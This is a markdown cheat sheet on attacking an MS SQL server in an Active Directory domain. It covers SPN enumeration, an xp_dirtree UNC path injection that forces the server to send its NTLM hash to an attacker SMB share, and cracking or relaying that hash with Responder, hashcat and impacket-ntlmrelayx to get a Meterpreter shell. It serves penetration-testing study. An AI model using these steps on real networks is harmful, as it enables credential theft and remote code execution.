# Hacking of an MS SQL server in an AD environment
## MS SQL Enum

Tool | Description | Additional Notes
--- | --- | ---
nmap | Ports scan | The traditional way
SPN | Service Principal Name | Stored in AD and links the service account to the SQL Server and the associated Win Server
setspn | DC Query | List the registered SPNs related to MSSQL - eg. <pre lang=cmd>setspn -T [DOMAIN] -Q MSSQLSvc/*</pre>
.NET | DC Query | Use of Powershell or C# assemblies: [GetUserSPNs.ps1](https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1)

## MS SQL Authentication

### Stage 1
Method | Description | Additional Notes
--- | --- | ---
SQL Server login | Local account |
Windows account based auth | Win account - works through Kerberos | Allows to authenticate with a TGS ticket (Ticket Granting Service)

### Stage 2
Event | Description | Additonal Notes
--- | --- | ---
Account mapping | Login is mapped to a DB user account | **sa** is a MS SQL builtin account mapped to **dbo** - if no user account is mapped it defaults to the *guest* account: [MSDocs](https://docs.microsoft.com/en-us/previous-versions/dotnet/framework/data/adonet/sql/authentication-in-sql-server)

### Roles: [MSDocs](https://docs.microsoft.com/en-us/previous-versions/dotnet/framework/data/adonet/sql/server-and-database-roles-in-sql-server)
Account | Mapping | Perms
--- | --- | ---
sa | dbo | sysadmin
xyz | guest | public

### Manage auth in C#
Class and Method | Description | Additional Notes
--- | --- | ---
```SqlConnection``` class | Create a connection to an MS SQL Server |  ```System.Data.SqlClient``` namespace. More info in [MSDocs](https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection?view=netframework-4.8). The default database in MS SQL is called: ```master```
```Open``` method | Initiate the connection once the SqlConnection object is created |
```Close``` method | Close the connection |

That is enough to test a simple connection to the datase while loged in with a regular MS Win account (no creds needed as we rely on Kerberos). If this action is possible it's because the ```Builtin\Users``` group has access by default, and the ***Domain Users*** group is a member of ```Builtin\Users```.
Let's continue with the available opportunities we have...

<span id="read-method"></span>
Class and Method | Description | Additional Notes
--- | --- | ---
```SqlCommand``` class | Execute SQL query | eg. <pre lang=C#>SqlCommand("SELECT SYSTEM_USER;", conn)</pre>
```ExecuteReader``` method | Execute our SQL command | The method returns an ```SqlDataReader``` object eg. <pre lang=C#>cmd.ExecuteReader();</pre>
```Read``` method | Access the data within the ```SqlDataReader``` object | eg. <pre lang=C#>r.Read();</pre><br>And close once done.</br><pre lang=C#>r.Close();</pre>

### Interesting SQL Variables and Functions
Name | Description
--- | ---
```SYSTEM_USER``` var | Name of the SQL login for the current session
```USER_NAME``` var | Mapped user
```IS_SRVROLEMEMBER('ROLE')``` func | Determine if a specific login is a member of a server role: *public*, *sysadmin*, etc.

## UNC Path Injection
An attack that leads to Code Execution.

Here the SMB Share is controlled by the attacker.

```mermaid
sequenceDiagram
    participant SQL Server
    participant SMB Share
    participant Authentication Data (NTLM)
    SQL Server->>SMB Share: Force the SQL Server to connect to our SMB Share
    Authentication Data (NTLM)-->>SMB Share: 
    Note right of Authentication Data (NTLM): Included in the connection
    SQL Server->>Authentication Data (NTLM): Hash of the SQL user account
```

### Force the SQL Server to connect to our SMB Share
What We Need | Description | Additional Notes
--- | --- | ---
```xp_dirtree``` | It's an SQL procedure that lists all files in a given folder | SMB shares are accepted: [HowTo](https://www.sqlservercentral.com/blogs/how-to-use-xp_dirtree-to-list-all-files-in-a-folder)
UNC | Universal Naming Convention | An SMB share is supplied with a UNC path: [More info](https://en.wikipedia.org/wiki/Path)
IP Add | Hostname given as an IP address for our SMB Share | This way we force windows to rely on NTLM auth instead of Kerberos: [MSDocs](https://docs.microsoft.com/en-us/windows-server/security/kerberos/configuring-kerberos-over-ip)
```EXEC``` SQL Query | Execute the ```xp_dirtree``` procedure | eg. <pre lang=SQL>EXEC master..xp_dirtree \"\\\\192.168.1.10\\\\share\";</pre>
```SqlCommand``` class | Execute SQL query | eg. <pre lang=C#>SqlCommand(our_exec_query, conn)</pre>: see [above](#read-method)
```ExecuteReader``` method | Execute our SQL command | The method returns an ```SqlDataReader```: see [above](#read-method)

## Setup the SMB share
It has to initiate NTLM authentication when the SQL service account performs the connection.

Tools | Description | Additional Notes
--- | --- | ---
Responder | [About Responder and more](https://github.com/lgandx/Responder) - Fake share | Once our ***xp_dirtree*** exploit launched, we obtain an NTLMv2 hash [More info](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)

Once done, you have to crack the hash (thank you [hashcat](https://hashcat.net/hashcat/))

### Do it without hash cracking (because there are some unbreakable passwords DUDE!)
## Hash relay attack or Pass-The-Hash
:pushpin: The Net-NTLM hash cannot be used in this attack, we have to relay it to another host.\
:pushpin: Only possible if SMB-signin is not enabled (by default it is on DC). [MS Docs](https://docs.microsoft.com/en-gb/archive/blogs/josebda/the-basics-of-smb-signing-covering-both-smb1-andsmb2) \
:pushpin: Need a local admin victim

What We Need | Description | Additional Notes
--- | --- | ---
Impacket | Impacket is a collection of Python classes for working with network protocols | [More info](https://github.com/SecureAuthCorp/impacket)
Shellcode | To have a shell on the victim | You can build any payload of your choice (msfvenom could be useful). You can also check my [Win32 APIs for Hackers](https://www.xmind.net/m/MHFCd4/) mindmap to build one.
Powershell or Pwsh (linux) | Powershell | To avoid any error, you should get into the habit of encoding your payloads/parts of your weapons in base64.
Meterpreter | Well known feature from the Metasploit framework | Select the Multi/Handler exploit
nc | The famous netcat command | Only if you chose to go without a Meterpreter (:confused: What a waste in this case!)

```mermaid
    flowchart TD
        A[impacket-ntlmrelayx OPTIONS -t TARGET_IP -c CMD_TO_EXECUTE] --> |Madatory options: --no-http-server and -smb2support| B{Launched?}
        B -- Yes --> C[On a MS Windows box execute the exploit to force the SMB request from the SQL server - see above]
        C -- Auth --> D[NTLM authentication against our impacket craft and relaying of the Net-NTLM hash]
        D -- Shell --> E[Check your meterpreter listener]
        B -- No ----> A[impacket-ntlmrelayx OPTIONS -t TARGET_IP -c CMD_TO_EXECUTE]
 ```
 
 Et voila ¯\\\_(ツ)\_/¯ \
 Note that the attack was done with a low privilege access :wink:
